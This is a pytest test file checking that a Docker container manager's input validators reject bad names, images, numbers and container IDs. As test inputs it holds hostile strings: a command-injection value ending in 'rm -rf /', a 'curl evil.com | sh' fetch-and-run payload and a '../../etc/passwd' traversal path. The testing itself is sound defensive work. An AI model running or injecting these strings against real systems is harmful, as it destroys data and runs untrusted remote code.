import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from bot.services.docker_manager import DockerManager, DockerValidationError  # noqa: E402


@pytest.fixture
def manager():
    return DockerManager()


def test_validate_name_rejects_empty(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_name("")


def test_validate_name_rejects_too_short(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_name("a")


def test_validate_name_rejects_shell_metacharacters(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_name("evil; rm -rf /")


def test_validate_name_accepts_valid(manager):
    assert manager._validate_name("user-vps-123") == "user-vps-123"


def test_validate_image_rejects_empty(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_image("")


def test_validate_image_rejects_shell_injection(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_image("nginx; curl evil.com | sh")


def test_validate_image_accepts_tagged_image(manager):
    assert manager._validate_image("itzg/minecraft-server:latest") == "itzg/minecraft-server:latest"


def test_validate_positive_number_rejects_zero(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_positive_number(0, "cpu")


def test_validate_positive_number_rejects_non_numeric(manager):
    with pytest.raises(DockerValidationError):
        manager._validate_positive_number("not-a-number", "ram")


def test_validate_positive_number_accepts_valid(manager):
    assert manager._validate_positive_number(2, "cpu") == 2.0


def test_get_owned_container_rejects_invalid_id_format(manager):
    with pytest.raises(DockerValidationError):
        manager._get_owned_container("../../etc/passwd")


def test_get_owned_container_rejects_empty_id(manager):
    with pytest.raises(DockerValidationError):
        manager._get_owned_container("")
